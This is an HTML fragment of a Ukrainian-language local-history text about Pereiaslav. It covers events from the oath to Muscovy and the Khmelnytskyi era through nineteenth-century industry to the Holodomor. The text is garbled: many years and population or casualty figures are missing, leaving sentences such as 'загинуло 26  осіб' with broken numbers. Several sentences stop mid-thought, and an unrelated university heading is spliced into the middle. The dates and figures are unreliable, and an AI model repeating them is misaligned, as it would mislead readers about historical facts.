	<p>До всіх міст і полків України вирушили московські посланці для складання присяги на місцях, але не скрізь їх радо зустрічали. Наприклад, київське духовенство не склало присяги і взагалі неприязно сприйняло це єднання. Також не склали присяги полковники Іван Богун і Мартин Пушкар. Після смерті Богдана Хмельницького між представниками старшини почались чвари та боротьба за владу.</p>
<p>Значну територію України охопили народні повстання. У липні року повстання спалахнуло в Переяславському полку. Проте місто розвивалося. У Переяславі функціонували 2 школи — при Успенській та Покровській церквах. Великого розмаху набуло будівництво, здебільшого дерев'яне.</p>
<p>Відбудували Михайлівську церкву, зруйновану татарами. Коштом гетьмана Івана Мазепи звели головний собор Вознесенського монастиря. Після ліквідації на Лівобережній Україні полкового устрою року Переяслав став повітовим містом Київського намісництва , а від початку XIX ст. Місто зростало. Так, року кількість населення становила жителів, року — вже 10  осіб.</p>
<p>У поміщицьких господарствах Переяславщини розвивалися цукроваріння , винокуріння , виробництво зернових. У самому Переяславі промисловість була розвинена мало. Крім землеробства, люди займалися кустарними промислами: ткацтвом , чинбарством , шевством. Наприкінці XIX ст.</p><strong><a id='d3'></a><h2>Університет Григорія Сковороди в Переяславі • ПХДПУ</h2></strong><p>Значну частину культурних пам'яток Переяслава знищили під час атеїстичної боротьби х рр. Під час Голодомору — в місті й районі загинуло 26  осіб. Ще життів переяславців забрала війна.</p>
		
			
